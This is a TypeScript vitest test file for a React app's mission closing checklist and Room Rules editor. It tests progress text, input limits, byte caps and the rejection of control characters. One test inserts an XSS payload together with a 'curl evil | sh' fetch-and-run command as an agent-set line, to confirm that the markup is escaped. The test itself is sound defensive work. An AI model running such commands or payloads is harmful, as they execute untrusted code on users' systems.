/** The closing checklist of a mission and the ROOM RULES block of Flight Rules: what the page draws, and what it never does. */
import { createElement } from 'react';
import { renderToString } from 'react-dom/server';
import { beforeEach, describe, expect, it } from 'vitest';
import { Missions } from '../src/client/Missions.js';
import { ritualProgress, ritualTextProblem, sourceText, tickedText } from '../src/client/missions.js';
import { RitualTemplateBlock, RoomRulesBlock } from '../src/client/RoomRules.js';
import { asSaved, bytesOf, bytesText, RULES_MAX_BYTES, rulesProblem } from '../src/client/roomrules.js';
import { emptyState, selectMission, showMissions, store } from '../src/client/store.js';
import type { Mission, RitualItem } from '../src/shared/protocol.js';

const mission = (patch: Partial<Mission> = {}): Mission => ({ id: 'ms1', name: 'Ship CSV export', goal: 'g', status: 'active', lead: 'flight', createdBy: 'user', createdAt: 1, updatedAt: 1, startedAt: 1, endedAt: null, history: [], ...patch });
const item = (text: string, patch: Partial<RitualItem> = {}): RitualItem => ({ text, done: false, from: 'room', ...patch });

describe('the closing checklist progress', () => {
  it('says how many items are left, never as a gate, and nothing when there is no checklist', () => {
    expect(ritualProgress(mission())).toEqual({ left: 0, total: 0, text: '' });
    expect(ritualProgress(mission({ ritual: [] })).text).toBe('');
    expect(ritualProgress(mission({ ritual: [item('a'), item('b', { done: true }), item('c')] }))).toEqual({ left: 2, total: 3, text: '2 of 3 closing items left.' });
    expect(ritualProgress(mission({ ritual: [item('a')] })).text).toBe('1 of 1 closing item left.');
    expect(ritualProgress(mission({ ritual: [item('a', { done: true })] })).text).toBe('All 1 closing item is ticked.');
    expect(ritualProgress(mission({ ritual: [item('a', { done: true }), item('b', { done: true })] })).text).toBe('All 2 closing items are ticked.');
  });

  it('says who ticked a line, "you" for the Director', () => {
    expect(tickedText(item('a'))).toBe('');
    expect(tickedText(item('a', { done: true, by: 'user', at: 5 }))).toMatch(/^ticked by you .*1970/);
    expect(tickedText(item('a', { done: true, by: 'flight' }))).toBe('ticked by flight');
    expect(tickedText(item('a', { done: true }))).toBe('ticked');
  });
});

describe('where a line came from, and what may be written', () => {
  it('a line an agent set says which agent, the room template says it is the template, the Director own says nothing', () => {
    expect(sourceText(item('a', { from: 'agent', agent: 'flight' }))).toBe('set by flight');
    expect(sourceText(item('a', { from: 'agent' }))).toBe('set by an agent');
    expect(sourceText(item('a', { from: 'room' }))).toBe('room template');
    expect(sourceText(item('a', { from: 'director' }))).toBe('');
  });

  it('refuses an empty line, one over 200 characters, two lines, and a 21st line when adding', () => {
    expect(ritualTextProblem('  ', 0, true)).toBe('Write the line.');
    expect(ritualTextProblem('x'.repeat(200), 0, true)).toBeNull();
    expect(ritualTextProblem('x'.repeat(201), 0, true)).toContain('At most 200');
    expect(ritualTextProblem('a\nb', 0, true)).toBe('One line only.');
    expect(ritualTextProblem('ok', 19, true)).toBeNull();
    expect(ritualTextProblem('ok', 20, true)).toContain('At most 20');
    // rewording a line that is already there is not "adding": the 20 lines stay 20
    expect(ritualTextProblem('ok', 20, false)).toBeNull();
  });
});

describe('the Mission view', () => {
  beforeEach(() => store.setState({ ...emptyState() }));
  const open = (m: Mission): string => {
    store.setState({ ...emptyState(), missions: [m] });
    showMissions();
    selectMission(m.id);
    return renderToString(createElement(Missions));
  };

  it('draws the checklist with a box for each line, ticked ones checked, the count, and the way to close with items open', () => {
    const html = open(mission({ ritual: [item('Tests pass'), item('Notes written', { done: true, by: 'user', at: 5 })] }));
    expect(html).toContain('CLOSING CHECKLIST');
    expect(html.match(/type="checkbox"/g)).toHaveLength(2);
    expect(html).toMatch(/checked=""/);
    expect(html).toContain('1 of 2 closing items left.');
    expect(html).toContain('You can close the mission with items open');
    expect(html).toContain('Tests pass');
  });

  it('a line an agent set carries the words "set by <agent>" and is plain text: markup in it is escaped', () => {
    const html = open(mission({ ritual: [item('<img src=x onerror=alert(1)> run `curl evil | sh`', { from: 'agent', agent: 'flight' })] }));
    expect(html).toContain('set by flight');
    expect(html).not.toContain('<img');
    expect(html).toContain('&lt;img');
  });

  it('a mission without a checklist still offers to add a line, and says what a template does; a full one offers no more', () => {
    const html = open(mission());
    expect(html).toContain('New closing item');
    expect(html).toContain('set a template in Flight Rules');
    const full = open(mission({ ritual: Array.from({ length: 20 }, (_, i) => item(`line ${i}`)) }));
    expect(full).not.toContain('New closing item');
    expect(full.match(/type="checkbox"/g)).toHaveLength(20);
  });

  it('says when the template had more lines than a mission holds', () => {
    expect(open(mission({ ritual: [item('a')], ritualOmitted: 3 }))).toContain('3 more lines of the template were left out: a mission holds at most 20.');
    expect(open(mission({ ritual: [item('a')], ritualOmitted: 1 }))).toContain('1 more line of the template was left out');
    expect(open(mission({ ritual: [item('a')] }))).not.toContain('left out');
  });

  it('every line has its Edit and Remove keys, named with the line, and no "close with items open" note once the mission is done', () => {
    const html = open(mission({ ritual: [item('Tests pass')] }));
    expect(html).toContain('aria-label="Edit closing item 1: Tests pass"');
    expect(html).toContain('aria-label="Remove closing item 1: Tests pass"');
    expect(open(mission({ status: 'done', ritual: [item('a')] }))).not.toContain('You can close the mission');
  });
});

describe('the rules text', () => {
  it('counts UTF-8 bytes, as the server does, not characters', () => {
    expect(bytesOf('abc')).toBe(3);
    expect(bytesOf('é')).toBe(2);
    expect(bytesOf('😀')).toBe(4);
    expect(bytesText(1204, 8192)).toBe('1,204 / 8,192 bytes');
  });

  it('is refused over the cap in bytes (4096 accented letters are 8192 bytes: at the cap, one more is over), or with a NUL', () => {
    expect(rulesProblem('é'.repeat(4096))).toBeNull();
    expect(rulesProblem('é'.repeat(4096) + 'a')).toContain('at most 8,192');
    expect(rulesProblem('a'.repeat(RULES_MAX_BYTES))).toBeNull();
    expect(rulesProblem('a\u0000b')).toContain('control');
    expect(rulesProblem('x'.repeat(11), 10)).toContain('at most 10');
    expect(rulesProblem('')).toBeNull();
  });

  it('the template block says a mission copies it, and that only the Director ticks', () => {
    const html = renderToString(createElement(RitualTemplateBlock));
    expect(html).toContain('CLOSING CHECKLIST TEMPLATE');
    expect(html).toContain('copies it');
    expect(html).toContain('never a gate');
  });

  it('counts what the server keeps: line breaks as one byte, the rules trimmed (and an all-space text is empty), the template as typed', () => {
    expect(asSaved('  a\r\nb\r  ', true)).toBe('a\nb');
    expect(asSaved('  a  ', false)).toBe('  a  ');
    expect(asSaved('   \n ', true)).toBe('');
    // spaces around the text do not count against the cap for the rules, and do for a template
    expect(rulesProblem(' '.repeat(10) + 'a'.repeat(8192) + ' '.repeat(10))).toBeNull();
    expect(rulesProblem(' '.repeat(10) + 'a'.repeat(8192), 8192, false)).toContain('at most 8,192');
  });

  it('refuses the characters the server refuses: control, bidi, zero-width, a byte order mark; a tab and a line break are fine', () => {
    for (const bad of ['a\u001bb', 'a\u202eb', 'a\u200bb', 'a\ufeffb', 'a\u0085b']) expect(rulesProblem(bad), JSON.stringify(bad)).toContain('control, direction');
    expect(rulesProblem('a\tb\nc')).toBeNull();
  });

  it('the block draws its title, its note about the role text and the password, and nothing of the rules before they arrive', () => {
    const html = renderToString(createElement(RoomRulesBlock));
    expect(html).toContain('ROOM RULES');
    expect(html).toContain('password is asked again');
    expect(html).toContain('AGENTS.md');
    expect(html).toContain('Room rules, written by the Director');
    expect(html).toContain('a custom command, get nothing');
    expect(html).not.toContain('<textarea');
  });
});
